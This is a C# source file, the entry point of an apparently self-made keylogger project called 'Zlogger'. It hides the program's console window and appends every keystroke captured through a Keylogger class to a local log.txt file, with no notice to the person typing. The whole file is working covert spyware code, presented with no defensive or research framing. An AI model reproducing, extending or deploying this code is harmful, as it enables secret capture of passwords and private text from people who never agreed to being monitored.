using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Rodjenihm.Zlogger.Core;
using Rodjenihm.Zlogger.WinAPI;

namespace Rodjenihm.Zlogger
{
    class Program
    {
        static void Main(string[] args)
        {
            var handle = Kernel32.GetConsoleWindow();
            User32.ShowWindow(handle, (int)WindowState.SW_HIDE);

            var log = "log.txt";
            using (var keylogger = new Keylogger(log))
            {
                keylogger.KeyDown += (sender, e) =>
                {
                    using (var sw = new StreamWriter(keylogger.LogPath, true))
                    {
                        sw.Write((Keys)e.VkCode);
                    }
                };

                keylogger.Run();
                Application.Run();
            }
        }
    }
}
